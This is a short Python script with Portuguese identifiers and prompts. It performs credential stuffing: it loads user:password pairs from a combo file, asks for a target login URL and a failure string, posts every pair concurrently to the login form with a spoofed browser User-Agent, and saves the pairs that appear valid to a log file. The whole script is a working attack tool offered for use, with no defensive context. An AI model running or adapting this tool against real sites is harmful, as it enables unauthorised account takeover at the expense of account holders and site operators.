import asyncio
import httpx

with open("combos.txt", "r", encoding="utf-8", errors="ignore") as cmbs:
    lists = [linha.strip() for linha in cmbs if ":" in linha]

url_test = str(input("digite a url: "))
error_page = str(input("digite o erro ao logar: "))

async def testar_login(user, senha):
    data =  {
    "user_login": user,
    "user_password": senha,
    "submit": "Sign in"
    }


    headers = {
            "User-Agent" : "Mozilla/5.0",
            "Content-Type" : "application/x-www-form-urlencoded"
        }
    try:
        async with httpx.AsyncClient() as client:
            resp = await client.post(url=url_test, data=data, headers=headers)

            print(f"\n🔎 TESTANDO: {user}:{senha}")
            print(f"STATUS: {resp.status_code}")
            
            if error_page.lower() in resp.text.lower() or error_page.lower() in str(resp.url).lower():
                print(f"login invalido: {user} and {senha}")
            else:
                print("Usuario e senha validos!")
                with open("logs.txt", "a", encoding=("utf-8"), errors="ignore") as lgs:
                    lgs.write (f"user: {user} pass: {senha}\n")

    except Exception as e:
        print(f"[ERRO] {user}:{senha} => {e}")

async def main ():
    tasks = []
    for linha in lists:
        user, senha = linha.split(":", 1)
        tasks.append(testar_login(user, senha))

    await asyncio.gather(*tasks)


asyncio.run(main())
